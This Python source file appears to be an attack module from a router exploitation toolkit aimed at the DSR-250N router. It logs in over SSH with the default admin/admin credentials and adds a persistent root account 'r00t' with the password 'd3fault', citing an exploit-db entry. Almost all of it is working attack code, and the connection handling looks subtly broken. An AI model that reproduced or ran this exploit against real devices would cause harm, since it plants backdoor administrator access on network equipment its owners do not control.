import util
from ..router_vuln import RouterVuln

__router__ = 'DSR-250N'
__vuln__='Add Admin'
class AddAdmin(RouterVuln):
	"""Add persistent root account.
	   http://www.exploit-db.com/exploits/22930/
	"""
	def __init__(self):
		super(AddAdmin,self).__init__()

	def run(self):
		try:
			import paramiko
		except ImportError:
			util.Error('Attack requires Paramiko library.')

		util.Msg('Adding \'r00t:d3fault\'...')
		try:
			ssh = paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			connection = ssh.connect(self.ip,username='admin',password='admin',
									timeout=3.0)
			channel = connection.get_transport().open_session()
			# add user
			channel.exec_command('system users edit 1')
			channel.exec_command('username r00t')
			channel.exec_command('password d3fault')
			channel.exec_command('save')
			connection.close()
		except paramiko.AuthenticationException:
			util.Error('Default credentials disabled/changed.')
		except Exception, e:
			util.Error('Error: %s'%e)
			return

		util.Msg('Done.')
